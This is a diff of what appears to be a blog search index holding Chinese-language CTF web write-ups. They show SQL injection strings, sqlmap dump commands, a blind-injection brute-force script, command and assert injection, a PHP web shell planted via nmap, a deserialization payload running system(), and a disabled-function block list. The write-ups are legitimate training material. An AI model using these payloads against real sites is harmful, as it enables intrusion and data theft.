@@ -126,6 +126,49 @@ EXECUTE name;  //执行预定义SQL语句
       </tags>
   </entry>
   <entry>
+    <title>20210522</title>
+    <url>/posts/2876c380/</url>
+    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
+</code></pre>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
+<p>http协议</p>
+</blockquote>
+<p>改代理</p>
+<pre><code>Referer:https://www.Sycsecret.com
+</code></pre>
+<p>改浏览器</p>
+<pre><code>User-Agent:Syclover
+</code></pre>
+<p>简单XFF</p>
+<pre><code>X-Forwarded-For:127.0.0.1
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
+<p>sql注入</p>
+</blockquote>
+<p>扫根目录</p>
+<pre><code>? num=1;var_dump(scandir(chr(47)))
+</code></pre>
+<p>flag文件内容</p>
+<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+</code></pre>
+<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
+<p>文件上传</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210519</title>
     <url>/posts/948949cb/</url>
     <content><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><blockquote>
@@ -247,49 +290,6 @@ id=0&#39; union select 1,2,3,列名 from 表名#
         <tag>web</tag>
         <tag>sql注入</tag>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210522</title>
-    <url>/posts/2876c380/</url>
-    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
-</code></pre>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
-<p>http协议</p>
-</blockquote>
-<p>改代理</p>
-<pre><code>Referer:https://www.Sycsecret.com
-</code></pre>
-<p>改浏览器</p>
-<pre><code>User-Agent:Syclover
-</code></pre>
-<p>简单XFF</p>
-<pre><code>X-Forwarded-For:127.0.0.1
-</code></pre>
-<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
-<p>sql注入</p>
-</blockquote>
-<p>扫根目录</p>
-<pre><code>? num=1;var_dump(scandir(chr(47)))
-</code></pre>
-<p>flag文件内容</p>
-<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
-</code></pre>
-<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
-<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
-<p>文件上传</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -615,6 +615,40 @@ Submit
       </categories>
   </entry>
   <entry>
+    <title>202108203</title>
+    <url>/posts/401ec127/</url>
+    <content><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and 0 union select 1,2,3 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,TABLE_SCHEMA,TABLE_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.COLUMNS 表 表名</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and 0 union select 1,column_name,data_type from information_schema.columns where table_name=&#x27;</span>secret_table<span class="string">&#x27;# 列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,fl4g <span class="keyword">from</span> secret_table #</span><br></pre></td></tr></table></figure>
+
+<p>查找显示位</p>
+<pre><code>1&#39; order by 3 #
+1&#39; union select 1,2,3#
+</code></pre>
+<h1 id="sqlmap用法"><a href="#sqlmap用法" class="headerlink" title="sqlmap用法"></a>sqlmap用法</h1><h2 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h2><p>用bp抓包后，copy files到sqlmap目录</p>
+<p>使用方法</p>
+<pre><code>python3 sqlmap.py -r 1.txt
+</code></pre>
+<p>查看所有数据库</p>
+<pre><code>python3 sqlmap.py -r 1.txt --dbs
+</code></pre>
+<p>查看库下表</p>
+<pre><code>python3 sqlmap.py -r 1.txt -D news --tables
+</code></pre>
+<p>查看表下列</p>
+<pre><code>python3 sqlmap.py -r 1.txt -D news -T secret_table --columns
+</code></pre>
+<p>查看列下内容</p>
+<pre><code>python3 sqlmap.py -r 1.txt -D news -T secret_table -C fl4g --dump
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>对web漏洞常见缩写的解释</title>
     <url>/posts/e15b0610/</url>
     <content><![CDATA[<h1 id="对web漏洞常见缩写的解释"><a href="#对web漏洞常见缩写的解释" class="headerlink" title="对web漏洞常见缩写的解释"></a>对web漏洞常见缩写的解释</h1><h2 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h2><p>全称<strong>Cross Site Scripting</strong>，攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
@@ -646,6 +680,20 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210827</title>
+    <url>/posts/50c4a45c/</url>
+    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -688,85 +736,27 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210827</title>
-    <url>/posts/50c4a45c/</url>
-    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>202108203</title>
-    <url>/posts/401ec127/</url>
-    <content><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and 0 union select 1,2,3 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,TABLE_SCHEMA,TABLE_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.COLUMNS 表 表名</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and 0 union select 1,column_name,data_type from information_schema.columns where table_name=&#x27;</span>secret_table<span class="string">&#x27;# 列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,fl4g <span class="keyword">from</span> secret_table #</span><br></pre></td></tr></table></figure>
-
-<p>查找显示位</p>
-<pre><code>1&#39; order by 3 #
-1&#39; union select 1,2,3#
-</code></pre>
-<h1 id="sqlmap用法"><a href="#sqlmap用法" class="headerlink" title="sqlmap用法"></a>sqlmap用法</h1><h2 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h2><p>用bp抓包后，copy files到sqlmap目录</p>
-<p>使用方法</p>
-<pre><code>python3 sqlmap.py -r 1.txt
-</code></pre>
-<p>查看所有数据库</p>
-<pre><code>python3 sqlmap.py -r 1.txt --dbs
-</code></pre>
-<p>查看库下表</p>
-<pre><code>python3 sqlmap.py -r 1.txt -D news --tables
-</code></pre>
-<p>查看表下列</p>
-<pre><code>python3 sqlmap.py -r 1.txt -D news -T secret_table --columns
-</code></pre>
-<p>查看列下内容</p>
-<pre><code>python3 sqlmap.py -r 1.txt -D news -T secret_table -C fl4g --dump
-</code></pre>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210926</title>
-    <url>/posts/2601fefd/</url>
-    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
-<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
-<p>这个题呢，最终就是直接跑脚本</p>
-<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
-<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
-<p>sql的三目运算</p>
-<pre><code>if( 表达式1，表达式2，表达式3)
-</code></pre>
-<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
-<p>或者异或注入</p>
-<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
-</code></pre>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
-<blockquote>
-<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
+    <title>20210927</title>
+    <url>/posts/5106ce6b/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
+<p>php模板注入</p>
 </blockquote>
-<p>进行尝试，</p>
-<p>首先id=1union：</p>
-<p>SQL Injection Checked.</p>
-<p>再试试id=union1union：</p>
-<p>bool(false)</p>
-<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
-<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
+<p>php存在模板注入漏洞，不仅python有，php也有</p>
+<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
+<p>反序列化绕过</p>
+</blockquote>
+<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
+<p>直接cat flag也没有，只能find命令了</p>
+<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
-<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+<p>写出exp</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到pyload: </p>
+<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+</code></pre>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
@@ -774,30 +764,25 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>测试工具</tag>
+        <tag>反序列化</tag>
+        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210901</title>
-    <url>/posts/8a5309dc/</url>
-    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
-<p>git泄露，代码审计，assert命令执行</p>
-</blockquote>
-<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+    <title>20210907</title>
+    <url>/posts/6330ace9/</url>
+    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
+<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
+<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
 </code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
-</code></pre>
-<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
-]]></content>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+        <tag>命令执行</tag>
         <tag>rce</tag>
       </tags>
   </entry>
@@ -858,18 +843,24 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>sql注入</tag>
-        <tag>代码审计</tag>
         <tag>文件上传</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210907</title>
-    <url>/posts/6330ace9/</url>
-    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
-<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
-<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
+    <title>20210901</title>
+    <url>/posts/8a5309dc/</url>
+    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
+<p>git泄露，代码审计，assert命令执行</p>
+</blockquote>
+<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
 </code></pre>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span 